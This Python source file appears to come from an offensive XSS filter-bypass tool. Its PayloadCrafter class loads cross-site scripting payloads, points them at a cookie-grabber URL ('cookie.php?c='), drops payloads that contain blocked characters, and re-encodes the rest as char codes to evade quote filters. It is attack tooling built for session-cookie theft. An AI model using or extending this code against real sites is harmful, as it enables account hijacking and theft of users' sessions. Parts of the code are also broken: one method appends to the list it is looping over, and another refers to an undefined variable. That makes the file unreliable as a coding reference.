import sys
from XSSFilterBypass.Obfuscator import *

class PayloadCrafter:

    def __init__(self, grabberAddress="http://localhost/cookie.php?c="):
        self.payloads = []
        self.restricted = []
        self.oldAddress = "http://localhost/cookie.php?c="
        self.grabberAddress = grabberAddress
                
        self.load_payloads()
        
    def set_grabber_address(self, **args):
        if type(args["grabberAddress"]) is str:
            self.grabberAddress = args["grabberAddress"]
        else:
            sys.stderr.write("Error. Address of the grabber has to be a string.")
            raise TypeError
    
    def load_payloads(self):
        with open('XSSFilterBypass/payloads.txt', 'r') as payloads:
            for payload in payloads:
                self.payloads.append(payload.strip())
      
    def clear_restricted(self):
        self.restricted = []
        
    def add_restricted(self, elements):
        if type(elements) is str:
            self.restricted.append(elements)
        elif type(elements) is int:
            self.restricted.append(str(elements))
        elif type(elements) is list:
            for element in elements:
                self.add_restricted(element)
        else:
            sys.stderr.write("Error. restricted items must be passed as a string or a list.\n")
            raise TypeError
    
    def replace_host(self, payload):
        return payload.replace(self.oldAddress, self.grabberAddress)
    
    def get_payloads(self):
        payloads = []
        for payload in self.payloads:
            if not any([i in payload for i in self.restricted]):
                payloads.append(self.replace_host(payload))
            if "'" in self.restricted or '"' in self.restricted:
                for payload in payloads:
                    payloads.append(to_char_code(payload))
        print(payloads)
        self.payloads = payloads
        return self.payloads
        
    def char_code(self, payload):
        payloads.append(to_char_code(payload))


    def add_payload_to_list(self, payload):
        with open('payloads.txt', 'a+') as f:
            f.write(payload + '\n')



